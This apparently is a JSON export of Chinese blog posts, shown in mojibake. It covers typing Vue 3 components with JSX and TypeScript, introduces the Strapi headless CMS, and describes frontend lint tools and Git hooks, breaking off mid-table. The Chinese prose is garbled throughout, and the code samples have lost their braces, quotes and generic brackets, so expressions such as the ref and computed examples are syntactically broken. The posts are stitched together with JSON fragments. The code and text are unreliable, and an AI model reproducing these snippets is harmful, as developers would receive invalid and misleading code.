Vue3 - https://cn.vuejs.org/guide/introduction.html JSX - https://cn.vuejs.org/guide/extras/render-function.html Typescript - https://ts.xcatliu.com/introduction/what-is-typescript.html å·¥ç¨‹æ­å»ºè„šæ‰‹æ¶å…ˆæ¥è¯´ä¸‹å¦‚ä½•æ­å»ºä¸ª Vue3 + Ts çš„è„šæ‰‹æ¶ï¼Œè¿™ä¹Ÿåˆ†ä¸¤ç§æƒ…å†µï¼Œä¸‹é¢åˆ†å¼€è¯´ï¼š ä»é›¶å¼€å§‹ ä»é›¶å¼€å§‹çš„è¯å¯ä»¥ä½¿ç”¨ create-vueï¼Œå³å®˜æ–¹çš„é¡¹ç›®è„šæ‰‹æ¶å·¥å…·ï¼Œæä¾›äº†åŸºäº vite + Ts çš„è„šæ‰‹æ¶æ¨¡æ¿ã€‚ æ›´å¤šçš„ä½¿ç”¨ç»†èŠ‚ï¼Œè§å®˜æ–¹æ–‡æ¡£ https://cn.vuejs.org/guide/typescript/overview.html#project-setup Vue ä¹‹å‰è¿˜æä¾›è¿‡ä¸€ä¸ª Vue CLI å·¥å…·åŸºäº webpack å¹³å°ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ç”Ÿæˆ Vue3 çš„è„šæ‰‹æ¶ï¼Œä½†æ˜¯ç°åœ¨å·²å¤„äºç»´æŠ¤çŠ¶æ€ï¼Œå®˜æ–¹ä¹Ÿå»ºè®®åŸºäº vite å¹³å°å¼€å‘ï¼Œå› æ­¤è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»äº†ã€‚ è„šæ‰‹æ¶å‡çº§ ç¬¬äºŒç§å°±æ˜¯åœ¨ç°æœ‰çš„è„šæ‰‹æ¶ä¸Šæ·»åŠ ä¸Š Typescript ï¼Œè¿™ç§æƒ…å†µå°±ä¸å¥½è¯´äº†ï¼ŒåŸå…ˆçš„è„šæ‰‹æ¶å¯èƒ½æ˜¯ Vue CLI ç”Ÿæˆçš„ï¼Œcreate-vue ç”Ÿæˆçš„ï¼Œæˆ–è€…ç›´æ¥ç”¨ webpackï¼Œrollup ç­‰å·¥å…·æ‰‹æ’¸å‡ºæ¥çš„ï¼Œå¯èƒ½æ€§å¤ªå¤šï¼Œæˆ‘ä¹Ÿæ²¡åŠæ³•æšä¸¾å‡ºæ¥ã€‚ è¿™é‡Œæˆ‘åˆ—ä¸‹æˆ‘åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ï¼Œå¦‚ä½•åœ¨ç°æœ‰çš„é¡¹ç›®ä¸­æ·»åŠ  TS çš„æ–‡æ¡£ï¼Œå¯ä»¥å‚è€ƒä¸‹ï¼š Vue CLIï¼šhttps://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-typescript Viteï¼šhttps://cn.vitejs.dev/guide/features.html#typescript Webpackï¼šhttps://webpack.docschina.org/guides/typescript/ Rollupï¼šhttps:www.npmjs.compackage@rollupplugin-typescript ç°åœ¨çš„å‰ç«¯å·¥ç¨‹éƒ½æ˜¯å¤šä¸ªå·¥å…·é›†æˆåœ¨ä¸€èµ·çš„è¶…å¤æ‚é…ç½®ï¼Œè€Œä¸Šé¢çš„æ–‡æ¡£éƒ½æ˜¯å•ç‚¹å·¥å…·çš„é›†æˆï¼Œä¸ä¸€å®šæœ‰ç”¨ï¼Œå› æ­¤è¿™é‡Œå»ºè®®é›†æˆ TS æ—¶å¯ä»¥ä» github ä¸Šæ‰¾ä¸‹æœ‰æ²¡æœ‰ç±»ä¼¼çš„é¡¹ç›®ï¼Œå‚è€ƒç°æœ‰å·¥ç¨‹å¯ä»¥è½»æ¾ä¸€ç‚¹ã€‚ é…ç½® JSXå¦‚ä½•åœ¨ Vue ä¸­ä½¿ç”¨ JSX éœ€è¦å•ç‹¬è¯´æ˜ä¸€ä¸‹ï¼Œå› ä¸ºå®ƒä¸€èˆ¬åœ¨è„šæ‰‹æ¶é‡Œä¸æ˜¯é»˜è®¤é…ç½®çš„ï¼ŒVue å®˜æ–¹æ¨èçš„å†™æ³•æ˜¯å•æ–‡ä»¶ç»„ä»¶ï¼Œä½†æ˜¯å…¶åœ¨çµæ´»æ€§ä¸Šè¿˜æ˜¯å·®ç‚¹æ„æ€ï¼Œå› æ­¤æˆ‘è¿˜æ˜¯æ›´å–œæ¬¢ç”¨ JSX å»å†™æ¨¡æ¿ã€‚ Vue å®˜æ–¹ä¹Ÿæ˜¯æœ‰è€ƒè™‘åˆ°æˆ‘ä»¬è¿™éƒ¨åˆ†äººçš„éœ€æ±‚ï¼Œå› æ­¤æ¨å‡ºäº†ä¸€ç³»åˆ—æ’ä»¶ï¼Œæ¥æ”¯æŒ JSX æ¨¡æ¿çš„æ¸²æŸ“ã€‚ Vite ## å®‰è£…ä¾èµ–pnpm add @vitejs/plugin-vue-jsx -D## åœ¨ vite.config.ts ä¸­æ·»åŠ æ’ä»¶import defineConfig from vite;import vueJsx from @vitejs/plugin-vue-jsx;export default defineConfig( plugins: [ vueJsx(), ]) Vue CLI ## æ£€æŸ¥ä¸‹ babel.config.js ä¸­é…ç½®æ˜¯æœ‰ @vue/cli-plugin-babel/presetï¼Œæœ‰çš„è¯æ— éœ€é¢å¤–é…ç½®## preset ä¸­å·²ç»åŒ…å«äº† jsx çš„æ’ä»¶é…ç½®module.exports = presets: [@vue/cli-plugin-babel/preset], plugins: [],;## å¦åˆ™çš„è¯å°±éœ€è¦å•ç‹¬é…ç½®äº†## å®‰è£…æ’ä»¶pnpm add @vue/babel-plugin-jsx -D## åœ¨ babel.config.js ä¸­æ·»åŠ æ’ä»¶module.exports = plugins: [@vue/babel-plugin-jsx],; ç±»å‹å®šä¹‰ä¸‹é¢æ¥åˆ°æ–‡ç« çš„é‡ç‚¹äº†ï¼Œæœ¬ç« èŠ‚ä¼šä»‹ç»ä¸‹å¦‚ä½•å¯¹ Vue çš„ä¸€äº›è¯­æ³•è¿›è¡Œç±»å‹æ ‡æ³¨ï¼Œä¸‹é¢çœ‹ä¸‹ä¸€ä¸ª Vue3 + JSX + Typescript çš„ç»„ä»¶é•¿ä»€ä¹ˆæ ·ï¼Ÿ import type SlotsType from vue;import defineComponent from vue;export const IconButton = defineComponent( name: IconButton, props: actived: type: Boolean, default: false, , tight: type: Boolean, default: false, , , emits: click: () = true , slots: Object as SlotsType default: any , setup(props, emit, slots ) return () = ( div onClick=() = emit(click) class=[ rounded cursor-pointer hover:bg-[rgba(0,0,0,.04)] inline-flex, props.tight ? p-1 : p-[6px], bg-[rgba(0,0,0,.04)]: props.actived , ] slots.default?.() /div ); ,); ä¼—æ‰€å‘¨çŸ¥ Vue3 çš„è¯­æ³•åˆ†æˆä¸¤ç§ï¼šç»„åˆå¼å’Œé€‰é¡¹å¼ï¼Œè¿™é‡Œé‡‡ç”¨çš„å°±æ˜¯é€‰é¡¹ç¤ºçš„å†™æ³•ï¼Œä½†æ˜¯å› ä¸ºé‡‡ç”¨äº† JSXï¼Œæ‰€æœ‰çš„ä»£ç éƒ½éœ€è¦åŒ…è£¹åœ¨ defineComponentï¼Œå¯¼è‡´ä»£ç çœ‹èµ·æ¥æ—¢åƒç»„åˆå¼åˆåƒé€‰é¡¹ç¤ºï¼Œèµ·åˆçœ‹æ–‡æ¡£æ—¶ä¹Ÿç»™æˆ‘æ•´æ‡µäº†ï¼Œå®é™…ä¸Šä»–è¿˜æ˜¯é€‰é¡¹ç¤ºï¼Œåªæ˜¯ propsï¼Œemits ç­‰å®šä¹‰å’Œç»„åˆå¼é›·åŒè€Œå·²ã€‚ ä¸ºç»„ä»¶çš„ props æ ‡æ³¨ç±»å‹import defineComponent from vue;export default defineComponent( props: message: String, , setup(props) props.message; // -- ç±»å‹ï¼šstring ,); å¤æ‚çš„ prop ç±»å‹ å¯¹äºå¤æ‚ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ PropType å·¥å…·ç±»å‹ï¼š import defineComponent from vueimport type PropType from vueexport default defineComponent( props: book: Object as PropTypeBook ) ä¸å€ŸåŠ©å·¥å…·å‡½æ•°ä¹Ÿå¯ä»¥ï¼š import defineComponent from vueimport type PropType from vueexport default defineComponent( props: book: Object as () = Book ) ä¸ºç»„ä»¶çš„ emits æ ‡æ³¨ç±»å‹import defineComponent from vue;export default defineComponent( emits: [change], setup(props, emit ) emit(change); // -- ç±»å‹æ£€æŸ¥ / è‡ªåŠ¨è¡¥å…¨ ,); å¦‚æœ emit å‡½æ•°æœ‰å…¥å‚ï¼Œæˆ‘ä»¬å¯ä»¥å°† emits æ”¹æˆå¯¹è±¡çš„å½¢å¼ï¼š import defineComponent from vueexport default defineComponent( emits: changeï¼š(value: string) = true, // å‡½æ•°å†…éƒ¨å¯ä»¥æ‰§è¡Œè¿è¡Œæ—¶æ£€æŸ¥ , setup(props, emit ) emit(change, text) // -- ç±»å‹æ£€æŸ¥ / è‡ªåŠ¨è¡¥å…¨ ) ä¸ºç»„ä»¶çš„ slots æ ‡æ³¨ç±»å‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SlotsType å·¥å…·ç±»å‹ï¼š import defineComponent from vueexport default defineComponent( slots: Object as SlotsType footer: any , setup(props, slots ) return () = ( div slots.footer?.() /div )) ä¸º ref() æ ‡æ³¨ç±»å‹ref ä¼šæ ¹æ®åˆå§‹åŒ–æ—¶çš„å€¼æ¨å¯¼å…¶ç±»å‹ï¼š import ref from vue;// æ¨å¯¼å‡ºçš„ç±»å‹ï¼šRefnumberconst year = ref(2020);// = TS Error: Type string is not assignable to type number.year.value = 2020; æœ‰æ—¶æˆ‘ä»¬å¯èƒ½æƒ³ä¸º ref å†…çš„å€¼æŒ‡å®šä¸€ä¸ªæ›´å¤æ‚çš„ç±»å‹ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ Ref è¿™ä¸ªç±»å‹ï¼š import ref from vue;import type Ref from vue;const year: Refstring | number = ref(2020);year.value = 2020; // æˆåŠŸï¼ æˆ–è€…ï¼Œåœ¨è°ƒç”¨ ref() æ—¶ä¼ å…¥ä¸€ä¸ªæ³›å‹å‚æ•°ï¼Œæ¥è¦†ç›–é»˜è®¤çš„æ¨å¯¼è¡Œä¸ºï¼š // å¾—åˆ°çš„ç±»å‹ï¼šRefstring | numberconst year = (ref string) | (number 2020);year.value = 2020; // æˆåŠŸï¼ å¦‚æœä½ æŒ‡å®šäº†ä¸€ä¸ªæ³›å‹å‚æ•°ä½†æ²¡æœ‰ç»™å‡ºåˆå§‹å€¼ï¼Œé‚£ä¹ˆæœ€åå¾—åˆ°çš„å°±å°†æ˜¯ä¸€ä¸ªåŒ…å« undefined çš„è”åˆç±»å‹ï¼š // æ¨å¯¼å¾—åˆ°çš„ç±»å‹ï¼šRefnumber | undefinedconst n = refnumber() ä¸º reactive() æ ‡æ³¨ç±»å‹reactive() ä¹Ÿä¼šéšå¼åœ°ä»å®ƒçš„å‚æ•°ä¸­æ¨å¯¼ç±»å‹ï¼š import reactive from vue;// æ¨å¯¼å¾—åˆ°çš„ç±»å‹ï¼š title: string const book = reactive( title: Vue 3 æŒ‡å¼• ); è¦æ˜¾å¼åœ°æ ‡æ³¨ä¸€ä¸ª reactive å˜é‡çš„ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¥å£ï¼š import reactive from vueinterface Book title: string year?: numberconst book: Book = reactive( title: Vue 3 æŒ‡å¼• ) ä¸æ¨èä½¿ç”¨ **reactive()** çš„æ³›å‹å‚æ•°ï¼Œå› ä¸ºå¤„ç†äº†æ·±å±‚æ¬¡ ref è§£åŒ…çš„è¿”å›å€¼ä¸æ³›å‹å‚æ•°çš„ç±»å‹ä¸åŒã€‚ ä¸º computed() æ ‡æ³¨ç±»å‹computed() ä¼šè‡ªåŠ¨ä»å…¶è®¡ç®—å‡½æ•°çš„è¿”å›å€¼ä¸Šæ¨å¯¼å‡ºç±»å‹ï¼š import ref, computed from vue;const count = ref(0);// æ¨å¯¼å¾—åˆ°çš„ç±»å‹ï¼šComputedRefnumberconst double = computed(() = count.value * 2);// = TS Error: Property split does not exist on type numberconst result = double.value.split(); ä½ è¿˜å¯ä»¥é€šè¿‡æ³›å‹å‚æ•°æ˜¾å¼æŒ‡å®šç±»å‹ï¼š const double = computed number (() = // è‹¥è¿”å›å€¼ä¸æ˜¯ number ç±»å‹åˆ™ä¼šæŠ¥é”™ ); ä¸º provide inject æ ‡æ³¨ç±»å‹provide å’Œ inject é€šå¸¸ä¼šåœ¨ä¸åŒçš„ç»„ä»¶ä¸­è¿è¡Œã€‚è¦æ­£ç¡®åœ°ä¸ºæ³¨å…¥çš„å€¼æ ‡è®°ç±»å‹ï¼ŒVue æä¾›äº†ä¸€ä¸ª InjectionKey æ¥å£ï¼Œå®ƒæ˜¯ä¸€ä¸ªç»§æ‰¿è‡ª Symbol çš„æ³›å‹ç±»å‹ï¼Œå¯ä»¥ç”¨æ¥åœ¨æä¾›è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´åŒæ­¥æ³¨å…¥å€¼çš„ç±»å‹ï¼š import provide, inject from vueimport type InjectionKey from vueconst key = Symbol() as InjectionKeystringprovide(key, foo) // è‹¥æä¾›çš„æ˜¯éå­—ç¬¦ä¸²å€¼ä¼šå¯¼è‡´é”™è¯¯const foo = inject(key) // foo çš„ç±»å‹ï¼šstring | undefined å»ºè®®å°†æ³¨å…¥ key çš„ç±»å‹æ”¾åœ¨ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥è¢«å¤šä¸ªç»„ä»¶å¯¼å…¥ã€‚ å½“ä½¿ç”¨å­—ç¬¦ä¸²æ³¨å…¥ key æ—¶ï¼Œæ³¨å…¥å€¼çš„ç±»å‹æ˜¯ unknownï¼Œéœ€è¦é€šè¿‡æ³›å‹å‚æ•°æ˜¾å¼å£°æ˜ï¼š const foo = inject string foo; // ç±»å‹ï¼šstring | undefined æ³¨æ„æ³¨å…¥çš„å€¼ä»ç„¶å¯ä»¥æ˜¯ undefinedï¼Œå› ä¸ºæ— æ³•ä¿è¯æä¾›è€…ä¸€å®šä¼šåœ¨è¿è¡Œæ—¶ provide è¿™ä¸ªå€¼ã€‚ å½“æä¾›äº†ä¸€ä¸ªé»˜è®¤å€¼åï¼Œè¿™ä¸ª undefined ç±»å‹å°±å¯ä»¥è¢«ç§»é™¤ï¼š const foo = inject string (foo, bar); // ç±»å‹ï¼šstring å¦‚æœä½ ç¡®å®šè¯¥å€¼å°†å§‹ç»ˆè¢«æä¾›ï¼Œåˆ™è¿˜å¯ä»¥å¼ºåˆ¶è½¬æ¢è¯¥å€¼ï¼š const foo = inject(foo) as string ä¸ºæ¨¡æ¿å¼•ç”¨æ ‡æ³¨ç±»å‹æ¨¡æ¿å¼•ç”¨éœ€è¦é€šè¿‡ä¸€ä¸ªæ˜¾å¼æŒ‡å®šçš„æ³›å‹å‚æ•°å’Œä¸€ä¸ªåˆå§‹å€¼ null æ¥åˆ›å»ºï¼š script setup lang=tsimport ref, onMounted from vueconst el = refHTMLInputElement | null(null)onMounted(() = el.value?.focus())/scripttemplate input ref=el //template å¯ä»¥é€šè¿‡ç±»ä¼¼äº MDN çš„é¡µé¢æ¥è·å–æ­£ç¡®çš„ DOM æ¥å£ã€‚ æ³¨æ„ä¸ºäº†ä¸¥æ ¼çš„ç±»å‹å®‰å…¨ï¼Œæœ‰å¿…è¦åœ¨è®¿é—® el.value æ—¶ä½¿ç”¨å¯é€‰é“¾æˆ–ç±»å‹å®ˆå«ã€‚è¿™æ˜¯å› ä¸ºç›´åˆ°ç»„ä»¶è¢«æŒ‚è½½å‰ï¼Œè¿™ä¸ª ref çš„å€¼éƒ½æ˜¯åˆå§‹çš„ nullï¼Œå¹¶ä¸”åœ¨ç”±äº v-if çš„è¡Œä¸ºå°†å¼•ç”¨çš„å…ƒç´ å¸è½½æ—¶ä¹Ÿå¯ä»¥è¢«è®¾ç½®ä¸º nullã€‚ ä¸ºç»„ä»¶æ¨¡æ¿å¼•ç”¨æ ‡æ³¨ç±»å‹æœ‰æ—¶ï¼Œä½ å¯èƒ½éœ€è¦ä¸ºä¸€ä¸ªå­ç»„ä»¶æ·»åŠ ä¸€ä¸ªæ¨¡æ¿å¼•ç”¨ï¼Œä»¥ä¾¿è°ƒç”¨å®ƒå…¬å¼€çš„æ–¹æ³•ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª MyModal å­ç»„ä»¶ï¼Œå®ƒæœ‰ä¸€ä¸ªæ‰“å¼€æ¨¡æ€æ¡†çš„æ–¹æ³•ï¼š !-- MyModal.vue --script setup lang=tsimport ref from vueconst isContentShown = ref(false)const open = () = (isContentShown.value = true)defineExpose( open)/script ä¸ºäº†è·å– MyModal çš„ç±»å‹ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦é€šè¿‡ typeof å¾—åˆ°å…¶ç±»å‹ï¼Œå†ä½¿ç”¨ TypeScript å†…ç½®çš„ InstanceType å·¥å…·ç±»å‹æ¥è·å–å…¶å®ä¾‹ç±»å‹ï¼š !-- App.vue --script setup lang=tsimport MyModal from ./MyModal.vueconst modal = refInstanceTypetypeof MyModal | null(null)const openModal = () = modal.value?.open()/script æ³¨æ„ï¼Œå¦‚æœä½ æƒ³åœ¨ TypeScript æ–‡ä»¶è€Œä¸æ˜¯åœ¨ Vue SFC ä¸­ä½¿ç”¨è¿™ç§æŠ€å·§ï¼Œéœ€è¦å¼€å¯ Volar çš„ Takeover æ¨¡å¼ã€‚ å¦‚æœç»„ä»¶çš„å…·ä½“ç±»å‹æ— æ³•è·å¾—ï¼Œæˆ–è€…ä½ å¹¶ä¸å…³å¿ƒç»„ä»¶çš„å…·ä½“ç±»å‹ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ ComponentPublicInstanceã€‚è¿™åªä¼šåŒ…å«æ‰€æœ‰ç»„ä»¶éƒ½å…±äº«çš„å±æ€§ï¼Œæ¯”å¦‚ $elã€‚ import ref from vue;import type ComponentPublicInstance from vue;const child = (ref ComponentPublicInstance) | (null null); æ€»ç»“ç”±äº Vue çš„è¯­æ³•ç³–å¤ªå¤šï¼Œå¯¼è‡´ Vue çš„å®˜æ–¹æ–‡æ¡£å°±åƒæ˜¯ä¸€ä¸ªå¤§æ‚çƒ©ï¼Œå¤§è€Œå…¨ï¼Œä¹Ÿå¯¼è‡´äº†æˆ‘åœ¨çœ‹å®˜æ–¹æ–‡æ¡£æ—¶è¢«å„ç§å†™æ³•ï¼Œå„ç§ API æçš„è¿·è¿·ç³Šç³Šã€‚å› æ­¤æˆ‘åœ¨å®˜æ–¹æ–‡æ¡£çš„åŸºç¡€ä¸ŠåŠ ä¸Šè‡ªå·±çš„ä¸€äº›ç†è§£ï¼Œæ•´ç†å‡ºäº†è¿™ç¯‡æ‰‹å†Œï¼Œå¸Œæœ›èƒ½å¸®åŠ©åˆ°ä½ ã€‚ï¼ˆå°å£°é€¼é€¼ä¸‹ï¼šè¿™å¥—æŠ€æœ¯æ ˆå†™èµ·æ¥å¥½åƒ react å•Šï¼Œè¦ä¸ä½ ä¸¤åˆå¹¶ç®—äº†ï¼‰"},{"title":"Strapiï¼šä¸€æ¬¾åŸºäºNode.js å¼€å‘çš„æ— å¤´å†…å®¹ç®¡ç†ç³»ç»Ÿ","path":"/2023/07/25/0415a8b11d8e/","content":"strapi æ˜¯ä»€ä¹ˆï¼Ÿstrapi è¿™ä¸ªåå­—å–è‡ª bootstrap çš„åç¼€ strapï¼Œç„¶åå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªæä¾›å¿«é€Ÿç”Ÿæˆå®‰å…¨å¯é çš„ api æ¶æ„ï¼Œç„¶åå†åŠ äº†ä¸€ä¸ª iï¼Œåˆå¹¶å°±æ˜¯ strapiï¼Œbootstrap çš„æœ‰å¯åŠ¨çš„æ„æ€ï¼Œä½ å¯ä»¥ç”¨ strapi æ¥å¿«é€Ÿæ„å»ºä½ çš„åç«¯ï¼Œå¯ä»¥å¿«é€Ÿè®©è‡ªå·±çš„é¡¹ç›®å¯åŠ¨ã€‚ å‡ ä¸ªå…³é”®è¯ å¿«é€Ÿ ï¼šæ˜¯å› ä¸ºä¸€ä¸ªå‘½ä»¤å°±ç”Ÿæˆäº†åç«¯ç”¨æˆ·ã€æƒé™ã€æ–‡ä»¶ä¸Šä¼ ç­‰åŸºæœ¬çš„åç«¯è½®å­ ç®€å•ï¼šstrapi å¯åŠ¨åï¼Œæœ‰ä¸€ä¸ªåç«¯ç®¡ç†é¡µé¢ï¼Œä½ å¯ä»¥åœ¨åç«¯æ–°å¢è¡¨ï¼Œæ–°å¢å®Œæˆåï¼Œåç«¯è‡ªåŠ¨é‡å¯ï¼Œç„¶åç”Ÿæˆä¸ä¹‹å¯¹åº”çš„å¢åˆ æ”¹æŸ¥çš„åŸºæœ¬ api å®‰å…¨ï¼šstrapi å……åˆ†è€ƒè™‘äº† api çš„å®‰å…¨æ€§ï¼Œå¯¹æ¯ä¸ªæ¥å£éƒ½æœ‰ä¿æŠ¤é™åˆ¶ï¼Œä½ å¯ä»¥åœ¨åç«¯ç®¡ç†é¡µé¢å»åšå®šåˆ¶åŒ–çš„é…ç½® æ’ä»¶åŒ–ï¼šå†…ç½®äº†åŸºæœ¬å¤Ÿç”¨çš„æ’ä»¶ï¼Œå¦‚å†…å®¹ç®¡ç†å™¨ã€API æ–‡æ¡£ã€åª’ä½“åº“ã€è§’è‰²æƒé™ï¼Œä½ ä¹Ÿå¯ä»¥æŒ‰ç…§å®˜æ–¹è®¾å®šï¼Œåˆ¶ä½œè‡ªå·±çš„æ’ä»¶ è‡ªå®šä¹‰ APIï¼šé™¤äº†å®˜æ–¹è‡ªåŠ¨ç”Ÿæˆçš„ apiï¼Œä½ ä¹Ÿå¯ä»¥è‡ªå·±ç¼–å†™å®šåˆ¶çš„ apiï¼Œå†…ç½®äº†ä¸°å¯Œçš„å˜é‡ï¼Œå¹¶æ”¯æŒ graphql æœ¬åœ°éƒ¨ç½²ï¼šstrapi æ˜¯å®Œå…¨å¼€æºçš„ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªåç«¯è½®å­ï¼Œdown ä¸‹æ¥åï¼Œæ”¹æ”¹ä¸šåŠ¡å°±å¯ä»¥å‘å¸ƒäº†ï¼Œå®Œå…¨ç”±ä½ æŒæ§ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªäº‘ç«¯äº§å“ã€‚ ä½ å¯ä»¥æŠŠ strapi å½“åšè‡ªå·±å¼€å‘é¡¹ç›®çš„å¿«é€Ÿå¯åŠ¨çš„å·¥å…·ï¼Œå°±ç®—æ²¡æœ‰åç«¯åŸºç¡€ï¼Œåªè¦ä¼š jsï¼Œä½ å°±å¯ä»¥å†™å‡ºä¸“ä¸šçº§çš„åç«¯ï¼Œæ˜¯å‰ç«¯å¼€å‘è€…çš„ç¦åˆ©ï¼Œæ›´æ˜¯ç‹¬ç«‹å¼€å‘è€…çš„ä¸€æŠŠå°–åˆ€åˆ©å™¨ï¼"},{"title":"å‰ç«¯ç¼–ç¨‹è§„èŒƒå·¥å…·é“¾","path":"/2023/07/17/a9d235b55733/","content":"å½“å¤šä¸ªå¼€å‘äººå‘˜åˆä½œå¼€å‘ä¸€ä¸ªå‰ç«¯é¡¹ç›®æ—¶ï¼Œä»£ç è´¨é‡å’Œä¸€è‡´æ€§æ˜¯éå¸¸é‡è¦çš„ã€‚åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œä»£ç è´¨é‡å’Œä¸€è‡´æ€§çš„ç¼ºå¤±å¯èƒ½ä¼šå¯¼è‡´å›¢é˜Ÿä¹‹é—´çš„æ²Ÿé€šé—®é¢˜å’Œä»£ç ç»´æŠ¤çš„å›°éš¾ã€‚ä¸ºäº†ç¡®ä¿ä»£ç è´¨é‡å’Œä¸€è‡´æ€§ï¼Œå‰ç«¯ç¼–ç¨‹è§„èŒƒå·¥å…·é“¾æ˜¯å¿…ä¸å¯å°‘çš„ã€‚ å®ƒå¯ä»¥å¸®åŠ©å›¢é˜Ÿåœ¨æ•´ä¸ªå¼€å‘å‘¨æœŸå†…ä¿æŒä»£ç é£æ ¼çš„ä¸€è‡´æ€§ï¼Œå‡å°‘é”™è¯¯å’Œå†²çªï¼Œå¹¶æé«˜ä»£ç è´¨é‡å’Œæ•ˆç‡ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä¸€äº›å¸¸ç”¨çš„å‰ç«¯ç¼–ç¨‹è§„èŒƒå·¥å…·ï¼Œä»¥åŠå®ƒä»¬å¦‚ä½•å¸®åŠ©å›¢é˜Ÿæé«˜ä»£ç è´¨é‡å’Œæ•ˆç‡ã€‚ Husky https://github.com/typicode/husky Husky æ˜¯ä¸€ä¸ª Git é’©å­å·¥å…·ï¼Œå¯ä»¥åœ¨ Git æ“ä½œï¼ˆä¾‹å¦‚æäº¤æˆ–æ¨é€ï¼‰ä¹‹å‰è¿è¡Œè„šæœ¬ã€‚å®ƒå¯ä»¥å¸®åŠ©å›¢é˜Ÿç¡®ä¿ä»£ç ç¬¦åˆå‰ç«¯ç¼–ç¨‹è§„èŒƒï¼Œå¹¶åœ¨æäº¤æˆ–æ¨é€ä¹‹å‰è¿è¡Œ ESLintã€Prettier å’Œ Stylelint ç­‰å·¥å…·ã€‚ Git HookGit hook éƒ½è¢«å­˜å‚¨åœ¨ Git ç›®å½•ä¸‹çš„ hooks å­ç›®å½•ä¸­ã€‚ ä¹Ÿå³ç»å¤§éƒ¨åˆ†é¡¹ç›®ä¸­çš„ .githooks ã€‚ è¿™äº›ä»¥ .sample ç»“å°¾çš„æ–‡ä»¶éƒ½æ˜¯åœ¨ git init åˆå§‹åŒ–æ—¶ï¼Œgit é»˜è®¤å®‰è£…çš„ç¤ºä¾‹æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶éƒ½æ˜¯ shell è„šæœ¬ï¼Œç§»é™¤åç¼€å°±å¯ä»¥å¯åŠ¨äº†ã€‚ è¿™äº›é’©å­çš„æ‰§è¡Œæ—¶æœºå’Œä½œç”¨å¦‚ä¸‹ï¼š åˆ†ç±» é’©å­ æè¿° æäº¤å·¥ä½œæµé’©å­ pre-commit git commit å‰è¿è¡Œï¼Œå¯ä»¥æ£€æŸ¥ä»£ç é£æ ¼æ˜¯å¦ä¸€è‡´ã€å•å…ƒæµ‹è¯•ç­‰ prepare-commit-msg é’©å­åœ¨å¯åŠ¨æäº¤ä¿¡æ¯ç¼–è¾‘å™¨ä¹‹å‰ï¼Œé»˜è®¤ä¿¡æ¯è¢«åˆ›å»ºä¹‹åè¿è¡Œã€‚ å®ƒå…è®¸ä½ ç¼–è¾‘æäº¤è€…æ‰€çœ‹åˆ°çš„é»˜è®¤ä¿¡æ¯ã€‚ commit-msg æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œgit commit ä¿¡æ¯çš„æ–‡ä»¶è·¯å¾„ï¼ˆé»˜è®¤ä¸º.gitCOMMIT_EDITMSGï¼‰ post-msg git commit ä¹‹åè¿è¡Œï¼Œä¸€èˆ¬ç”¨äºé€šçŸ¥ä¹‹ç±»çš„äº‹æƒ…ï¼Œå¦‚ï¼šgit log -1 HEAD ç”µå­é‚®ä»¶å·¥ä½œæµé’©å­ applypatch-msg å®ƒæ¥æ”¶å•ä¸ªå‚æ•°ï¼šåŒ…å«è¯·æ±‚åˆå¹¶ä¿¡æ¯çš„ä¸´æ—¶æ–‡ä»¶çš„åå­—ã€‚ å¦‚æœè„šæœ¬è¿”å›éé›¶å€¼ï¼ŒGit å°†æ”¾å¼ƒè¯¥è¡¥ä¸ã€‚ ä½ å¯ä»¥ç”¨è¯¥è„šæœ¬æ¥ç¡®ä¿æäº¤ä¿¡æ¯ç¬¦åˆæ ¼å¼ï¼Œæˆ–ç›´æ¥ç”¨è„šæœ¬ä¿®æ­£æ ¼å¼é”™è¯¯ã€‚ pre-applypatch å®ƒæ­£å¥½è¿è¡Œäºåº”ç”¨è¡¥ä¸ä¹‹åï¼Œäº§ç”Ÿæäº¤ä¹‹å‰ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç”¨å®ƒåœ¨æäº¤å‰æ£€æŸ¥å¿«ç…§ã€‚ ä½ å¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬è¿è¡Œæµ‹è¯•æˆ–æ£€æŸ¥å·¥ä½œåŒºã€‚ å¦‚æœæœ‰ä»€ä¹ˆé—æ¼ï¼Œæˆ–æµ‹è¯•æœªèƒ½é€šè¿‡ï¼Œè„šæœ¬ä¼šä»¥éé›¶å€¼é€€å‡ºï¼Œä¸­æ–­ git am çš„è¿è¡Œï¼Œè¿™æ ·è¡¥ä¸å°±ä¸ä¼šè¢«æäº¤ post-applypatch è¿è¡Œäºæäº¤äº§ç”Ÿä¹‹åï¼Œæ˜¯åœ¨ git am è¿è¡ŒæœŸé—´æœ€åè¢«è°ƒç”¨çš„é’©å­ã€‚ ä½ å¯ä»¥ç”¨å®ƒæŠŠç»“æœé€šçŸ¥ç»™ä¸€ä¸ªå°ç»„æˆ–æ‰€æ‹‰å–çš„è¡¥ä¸çš„ä½œè€…ã€‚ ä½†ä½ æ²¡åŠæ³•ç”¨å®ƒåœæ­¢æ‰“è¡¥ä¸çš„è¿‡ç¨‹ å…¶å®ƒå®¢æˆ·ç«¯é’©å­ pre-rebase git rebase ä¹‹å‰ post-rewrite è¢«é‚£äº›ä¼šæ›¿æ¢æäº¤è®°å½•çš„å‘½ä»¤è°ƒç”¨ï¼Œæ¯”å¦‚ git commit â€“amend å’Œ git 